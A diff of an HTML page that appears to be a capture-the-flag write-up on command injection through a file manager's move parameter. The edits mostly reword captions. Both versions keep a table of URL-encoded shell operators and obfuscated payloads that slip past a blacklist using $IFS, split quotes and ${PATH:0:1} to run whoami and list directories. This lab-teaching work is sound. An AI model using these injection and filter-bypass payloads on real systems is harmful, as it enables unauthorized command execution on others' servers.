@@ -65,7 +65,7 @@
         </div>
       </div>
 
-      <!-- Step 1 -->
+      <!-- Step 1: Authenticate as guest -->
       <section class="mb-12">
         <h2 class="text-2xl font-semibold mb-4">Step 1: Authenticate as guest</h2>
         <p class="mb-4">
@@ -78,29 +78,29 @@
           <img src="/images/CI2.png" alt="Entering guest credentials" class="w-full rounded-lg shadow-md mb-4 cursor-pointer">
         </a>
         <p class="mb-4">
-          We are presented our file list and the actions panel.
+          CI3.png shows successful login: our file list and the actions panel are visible.
         </p>
         <a href="/images/CI3.png" target="_blank" rel="noopener">
           <img src="/images/CI3.png" alt="Dashboard after login" class="w-full rounded-lg shadow-md cursor-pointer">
         </a>
       </section>
 
-      <!-- Step 2 -->
+      <!-- Step 2: Examine actions panel -->
       <section class="mb-12">
         <h2 class="text-2xl font-semibold mb-4">Step 2: Examine actions panel</h2>
         <p class="mb-4">
-          The panel offers copy and function operations on each file; this will be our possible entry point for injection.
+          The panel offers copy and function operations—our injection entry point.
         </p>
         <a href="/images/CI4.png" target="_blank" rel="noopener">
           <img src="/images/CI4.png" alt="Actions allowed panel" class="w-full rounded-lg shadow-md cursor-pointer">
         </a>
       </section>
 
-      <!-- Step 3 -->
+      <!-- Step 3: Write to tmp folder -->
       <section class="mb-12">
         <h2 class="text-2xl font-semibold mb-4">Step 3: Write to tmp folder</h2>
         <p class="mb-4">
-          We test writing into <code>/var/www/html/files/tmp</code>; it succeeds without restrictions.
+          We test writing into <code>/var/www/html/files/tmp</code>, which succeeds without restriction.
         </p>
         <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
           <a href="/images/CI5.png" target="_blank" rel="noopener">
@@ -112,11 +112,11 @@
         </div>
       </section>
 
-      <!-- Step 4 -->
+      <!-- Step 4: Path restriction enforcement -->
       <section class="mb-12">
         <h2 class="text-2xl font-semibold mb-4">Step 4: Path restriction enforcement</h2>
         <p class="mb-4">
-          Attempting to write outside tmp (e.g., <code>/tmp</code>) is blocked as malicious.
+          Writing outside tmp (e.g., <code>/tmp</code>) triggers a malicious block error.
         </p>
         <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
           <a href="/images/CI7.png" target="_blank" rel="noopener">
@@ -128,18 +128,18 @@
         </div>
       </section>
 
-      <!-- Step 5 -->
+      <!-- Step 5: Identify injection point -->
       <section class="mb-12">
         <h2 class="text-2xl font-semibold mb-4">Step 5: Identify injection point</h2>
         <p class="mb-4">
-          Intercepting in Burp shows the target path is passed via URL parameters after <code>index.php</code>. We can chain commands here.
+          Burp intercept shows the move parameter in the URL after <code>index.php</code>; we can append shell operators there.
         </p>
         <a href="/images/CI9.png" target="_blank" rel="noopener">
           <img src="/images/CI9.png" alt="Burp intercept showing URL" class="w-full rounded-lg shadow-md cursor-pointer">
         </a>
       </section>
 
-      <!-- Step 6 -->
+      <!-- Step 6: Operator reference -->
       <section class="mb-12">
         <h2 class="text-2xl font-semibold mb-4">Step 6: Operator reference</h2>
         <p class="mb-4">
@@ -155,14 +155,14 @@
             </tr>
           </thead>
           <tbody>
-            <tr><td class="border px-4 py-2">Semicolon</td><td class="border px-4 py-2">;</td><td class="border px-4 py-2">%3b</td><td class="border px-4 py-2">both commands</td></tr>
-            <tr><td class="border px-4 py-2">New line</td><td class="border px-4 py-2">\n</td><td class="border px-4 py-2">%0a</td><td class="border px-4 py-2">both commands</td></tr>
-            <tr><td class="border px-4 py-2">Background</td><td class="border px-4 py-2">&amp;</td><td class="border px-4 py-2">%26</td><td class="border px-4 py-2">runs both; second output first</td></tr>
-            <tr><td class="border px-4 py-2">Pipe</td><td class="border px-4 py-2">|</td><td class="border px-4 py-2">%7c</td><td class="border px-4 py-2">only second output</td></tr>
-            <tr><td class="border px-4 py-2">AND</td><td class="border px-4 py-2">&&</td><td class="border px-4 py-2">%26%26</td><td class="border px-4 py-2">second if first succeeds</td></tr>
-            <tr><td class="border px-4 py-2">OR</td><td class="border px-4 py-2">||</td><td class="border px-4 py-2">%7c%7c</td><td class="border px-4 py-2">second if first fails</td></tr>
-            <tr><td class="border px-4 py-2">Backticks</td><td class="border px-4 py-2">``</td><td class="border px-4 py-2">%60%60</td><td class="border px-4 py-2">both (Linux)</td></tr>
-            <tr><td class="border px-4 py-2">$()</td><td class="border px-4 py-2">$()</td><td class="border px-4 py-2">%24%28%29</td><td class="border px-4 py-2">both (Linux)</td></tr>
+            <tr><td class="border px-4 py-2">Semicolon</td><td class="border px-4 py-2">;</td><td class="border px-4 py-2">%3b</td><td class="border px-4 py-2">Both commands</td></tr>
+            <tr><td class="border px-4 py-2">New line</td><td class="border px-4 py-2">\n</td><td class="border px-4 py-2">%0a</td><td class="border px-4 py-2">Both commands</td></tr>
+            <tr><td class="border px-4 py-2">Background</td><td class="border px-4 py-2">&amp;</td><td class="border px-4 py-2">%26</td><td class="border px-4 py-2">Runs both; second output first</td></tr>
+            <tr><td class="border px-4 py-2">Pipe</td><td class="border px-4 py-2">|</td><td class="border px-4 py-2">%7c</td><td class="border px-4 py-2">Only second output</td></tr>
+            <tr><td class="border px-4 py-2">AND</td><td class="border px-4 py-2">&&</td><td class="border px-4 py-2">%26%26</td><td class="border px-4 py-2">Second if first succeeds</td></tr>
+            <tr><td class="border px-4 py-2">OR</td><td class="border px-4 py-2">||</td><td class="border px-4 py-2">%7c%7c</td><td class="border px-4 py-2">Second if first fails</td></tr>
+            <tr><td class="border px-4 py-2">Backticks</td><td class="border px-4 py-2">``</td><td class="border px-4 py-2">%60%60</td><td class="border px-4 py-2">Both commands (Linux)</td></tr>
+            <tr><td class="border px-4 py-2">$()</td><td class="border px-4 py-2">$()</td><td class="border px-4 py-2">%24%28%29</td><td class="border px-4 py-2">Both commands (Linux)</td></tr>
           </tbody>
         </table>
         <div class="space-y-4 mb-8">
@@ -175,11 +175,11 @@
         </div>
       </section>
 
-      <!-- Step 7 -->
+      <!-- Step 7: Blacklist bypass -->
       <section class="mb-12">
         <h2 class="text-2xl font-semibold mb-4">Step 7: Blacklist bypass</h2>
         <p class="mb-4">
-          The basic <code>whoami</code> is blocked. We obfuscate it using quotes and whitespace expansion:
+          The <code>whoami</code> command is blocked. We obfuscate it using quotes and whitespace expansion.
         </p>
         <pre class="bg-gray-200 p-4 rounded mb-4 overflow-x-auto text-sm">
 ?to=tmp$IFS%26w'h'oa'm'i&from=78113764.txt&finish=&move=
@@ -189,11 +189,11 @@
         </a>
       </section>
 
-      <!-- Step 8 -->
+      <!-- Step 8: Directory enumeration -->
       <section class="mb-12">
         <h2 class="text-2xl font-semibold mb-4">Step 8: Directory enumeration</h2>
         <p class="mb-4">
-          We list the contents of the home directory, including hidden files:
+          We list the home directory, including hidden files.
         </p>
         <pre class="bg-gray-200 p-4 rounded mb-4 overflow-x-auto text-sm">
 ?to=tmp$IFS%26l's'$IFS'-a'${HOME:0:1}&from=787113764.txt&finish=&move=
@@ -203,11 +203,11 @@
         </a>
       </section>
 
-      <!-- Step 9 -->
+      <!-- Step 9: Flag extraction -->
       <section class="mb-12">
         <h2 class="text-2xl font-semibold mb-4">Step 9: Flag extraction</h2>
         <p class="mb-4">
-          Finally, swap to <code>${PATH:0:1}</code> to target the root directory and read the flag:
+          Finally, swap to <code>${PATH:0:1}</code> to target root and read the flag.
         </p>
         <pre class="bg-gray-200 p-4 rounded mb-4 overflow-x-auto text-sm">
 ?to=tmp$IFS%26l's'$IFS'-a'${PATH:0:1}&from=787113764.txt&finish=&move=
